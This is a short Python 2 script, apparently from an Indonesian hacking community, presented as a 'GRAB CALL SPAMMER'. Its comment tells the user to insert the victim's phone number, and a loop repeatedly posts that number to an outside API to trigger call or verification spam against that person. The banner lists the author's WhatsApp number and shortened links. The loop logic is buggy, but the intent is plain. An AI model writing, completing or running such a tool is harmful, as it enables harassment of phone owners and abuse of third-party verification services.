#!/usr/bin/python
# -*- coding: utf-8 -*-
#ganti xxxxxxxxxx ( Dengan No korban )
# linux
import requests,json,time,subprocess
import os, time
import subprocess as sp

subprocess.call("clear", shell=True)

banner = """
                  |------#FFFFFF----
                  |█████████#FF0700|
                  |█████████|#FFFFFF
                  |-----#FFFFFF-----
                  |#FFFFFF
                  |#FFFFFF
 ____             |           #FF0008____      _ _
/ ___| _ __   __ _| _ __ __  / ___|__ _| | |
\___ \| '_ \ / _` | '_ ` _ \| |   / _` | | |        ___) | |_) | (_| | | | | | | |__| (_| | | |
|____/| .__/ \__,_|_| |_| |_|\____\__,_|_|_|
      |_|
                [Indonesia]
________________________________________________
                                                   ================================================
          [+] GRAB CALL SPAMMER [+]

 Coded by   : Mrrlughawiyah
 Blogspot    : http://bit.ly/2Uf1fLK
 WhatsApp : 087875061948
 YouTube    : http://bit.ly/2Fu5pKn
 Versi     : 3.0
 Pendukung : dhen
 Update    : 12-April-2019
"""

x = 0
print banner
a = raw_input("[+] Lanjutkan (y/n): ")
d = raw_input("[+] Jumlah : ")
while x < d:
   b = {"https://xxnx.com":a}
   c = " https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor=xxxxxxxxxx"
   e = requests.post(c, data=b)
   f = json.loads(e.text)
   if "nexmo_request_id" in f:
       print "[+] SUCESS WITH ID",f["nexmo_request_id"]
   else:
       print "[+] Spam berhasil"
